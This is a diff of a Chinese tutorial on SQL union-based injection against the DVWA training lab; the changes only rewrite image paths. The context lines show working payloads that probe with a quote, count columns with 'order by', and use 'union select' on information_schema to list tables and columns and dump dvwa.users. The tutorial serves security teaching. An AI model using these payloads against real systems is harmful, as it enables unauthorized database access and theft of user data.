@@ -10,13 +10,13 @@
 SELECT first_name, last_name FROM users WHERE user_id = '1';
 ```
 
-![](SQL联合查询注入/photo/1_1.jpg)
+![](image/1_1.jpg)
 
 此时服务器就会从users表中把满足user_id=1这个条件的行（记录）的first_name, last_name查询出来。
 
 在网站里显示为：
 
-![](SQL联合查询注入/photo/1_2.jpg)
+![](image/1_2.jpg)
 
 当输入单引号（'）的时候http://192.168.234.128/DVWA/vulnerabilities/sqli/?id=1'&Submit=Submit#，SQL语句就变为了
 
@@ -28,7 +28,7 @@ SELECT first_name, last_name FROM users WHERE user_id = '1'';
 
 如果能引起数据库的报错，说明用户是可以对查询语句进行修改的，说明存在漏洞。
 
-![](SQL联合查询注入/photo/1_3.jpg)
+![](image/1_3.jpg)
 
 ## 判断注入类型
 
@@ -63,7 +63,7 @@ SELECT first_name, last_name FROM users WHERE user_id = '1 and 1=2';
 
 数据库会把用户输入的内容当成了一体进行查询，将以上四条语句拿到数据库里执行，可以看到前两条语句会返回不一样的内容，后两条语句会返回相同的内容。 
 
-![](SQL联合查询注入/photo/4_2_1.jpg)
+![](image/4_2_1.jpg)
 
 > 思考：为什么后两条语句同样是用and，但是输出的内容是相同的？ 
 
@@ -131,7 +131,7 @@ SELECT first_name, last_name FROM users WHERE user_id = '1' order by 2#';
 
 回显正常：
 
-![](SQL联合查询注入/photo/4_2_2.jpg)
+![](image/4_2_2.jpg)
 
 当`order by 3`时，后端程序执行的SQL语句为：
 
@@ -141,7 +141,7 @@ SELECT first_name, last_name FROM users WHERE user_id = '1' order by 3#';
 
 发生了报错：
 
-![](SQL联合查询注入/photo/4_2_3.jpg)
+![](image/4_2_3.jpg)
 
 * 图中URL的%23为井号（#）进行了url编码，是为了将SQL语句中多余的单引号注释掉，GET型注入可以使用`#`号的URL编码`%23`或者`--+`进行注释。
 * `%20`是空格的URL编码
@@ -162,7 +162,7 @@ SELECT first_name, last_name FROM users WHERE user_id = '1' union select 1,2#';
 
 网站回显为：
 
-![](SQL联合查询注入/photo/4_2_4.jpg)
+![](image/4_2_4.jpg)
 
 但是在实战中一般不查询`union`左边的内容，一是因为程序在展示数据的时候通常只会取结果集的第一行数据，二是因为`union`左边查询出来的内容对我们基本没用。所以，只要让第一行查询的结果是空集，即`union`左边的`select`子句查询结果为空，那么`union `右边的查询结果自然就成为了第一行，打印在网页上了。所以让`union`左边查询不到，可以将其改为负数或者改为比较大的数字。
 
@@ -180,7 +180,7 @@ SELECT first_name, last_name FROM users WHERE user_id = '-1' union select databa
 
 网站回显
 
-![](SQL联合查询注入/photo/1.jpg)
+![](image/1.jpg)
 
 ### 获取数据库中的表名
 
@@ -210,7 +210,7 @@ SELECT first_name, last_name FROM users WHERE user_id = '-1'union select 1,table
 
 一个表名为一个回显
 
-![](SQL联合查询注入/photo/3.jpg)
+![](image/3.jpg)
 
 #### 方法二：
 
@@ -223,7 +223,7 @@ SQL:
 SELECT first_name, last_name FROM users WHERE user_id = '-1'union select 1,group_concat(table_name) from Information_schema.tables where table_schema = database()#';
 ```
 
-![](SQL联合查询注入/photo/2.jpg)
+![](image/2.jpg)
 
 #### 方法三：
 
@@ -234,7 +234,7 @@ SQL:
 SELECT first_name, last_name FROM users WHERE user_id = '-1'union select 1,(select group_concat(table_name) from Information_schema.tables where table_schema = database())#';
 ```
 
-![](SQL联合查询注入/photo/4.jpg)
+![](image/4.jpg)
 
 ### 获取数据库中某个表的字段
 
@@ -247,7 +247,7 @@ SQL:
 SELECT first_name, last_name FROM users WHERE user_id = '-1'union select 1,group_concat(column_name) from Information_schema.columns where table_schema='dvwa' and table_name='users'#';
 ```
 
-![](SQL联合查询注入/photo/5.jpg)
+![](image/5.jpg)
 
 ### 获取数据库中某个表中的记录
 
@@ -260,4 +260,4 @@ SQL:
 SELECT first_name, last_name FROM users WHERE user_id = '-1'union select 1,group_concat(user) from dvwa.users#';
 ```
 
-![](SQL联合查询注入/photo/6.jpg)
+![](image/6.jpg)
